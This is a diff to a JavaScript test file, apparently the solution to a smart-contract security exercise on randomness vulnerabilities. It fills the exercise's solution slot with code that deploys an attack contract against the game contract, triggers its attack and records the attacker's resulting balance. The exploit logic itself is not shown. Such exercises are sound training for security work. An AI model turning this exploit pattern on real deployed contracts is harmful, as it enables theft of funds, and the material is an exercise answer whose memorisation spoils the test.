@@ -24,7 +24,20 @@ describe('Randomness Vulnerabilites Exercise 1', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR SOLUTION HERE */
+
+      /** CODE YOUR SOLUTION HERE */
+      const attackFactory = await ethers.getContractFactory(
+        'contracts/randomness-vulnerabilities-1/AttackGame.sol:AttackGame',
+        attacker
+      )
+
+      let attackGame = await attackFactory.deploy(this.game.address);
+
+      expect(await attackGame.owner()).to.be.equal(attacker.address);
+
+      await attackGame.connect(attacker).attack();
+
+      this.attackerFinalBalance = await ethers.provider.getBalance(attacker.address);
 
     });
 
